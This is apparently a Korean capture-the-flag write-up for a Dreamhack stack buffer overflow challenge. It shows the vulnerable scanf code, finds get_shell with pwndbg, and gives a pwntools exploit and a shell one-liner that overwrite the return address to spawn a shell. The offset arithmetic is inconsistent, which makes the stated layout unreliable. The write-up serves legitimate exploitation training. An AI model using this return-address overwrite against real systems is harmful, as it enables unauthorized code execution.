# ☘️ Return Address Overwrite <br>
Stack Buffer Overflow를 이용하여 return address를 덮어쓰고  `get_shell()` 함수로 실행 흐름을 변경 <br>

---

```c
char buf[0x28];
scanf("%s", buf);
```

scanf에서 입력 길이를 제한하지 않음 -> 취약점 <br> <br>

buffer (0x28) <br>
saved rbp (0x8) <br>
return address <br>
offset = 0x28 + 0x8 = 0x30 <br> <br>

get_shell의 주소 확인 <br>
```
$ gdb rao -q
pwndbg> print get_shell
$1 = {<text variable, no debug info>} 0x4006aa <get_shell>
pwndbg> quit
```
<br>
payload = buf + SFP + return adress = b"A"*0x30 + b"B"*0x8 + b'\xaa\x06\x40\x00\x00\x00\x00\x00

```python
from pwn import *

p = remote("host3.dreamhack.games", 16382)

payload = b"A"*0x30 + b"B"*0x8 + p64(0x4006aa)
p.sendline(payload)
p.interactive()
```
```
Input: $ id
uid=1000(rao) gid=1000(rao) groups=1000(rao)
$ cat flag
DH{<FLAG_REDACTED>}
```
<br>
cf) 터미널에서 직접 payload를 입력하는 방법
<br>

```
$ (python -c "import sys;sys.stdout.buffer.write(b'A'*0x30 + b'B'*0x8 + b'\xaa\x06\x40\x00\x00\x00\x00\x00')";cat)| ./rao
$ id
id
uid=1000(rao) gid=1000(rao) groups=1000(rao)
```



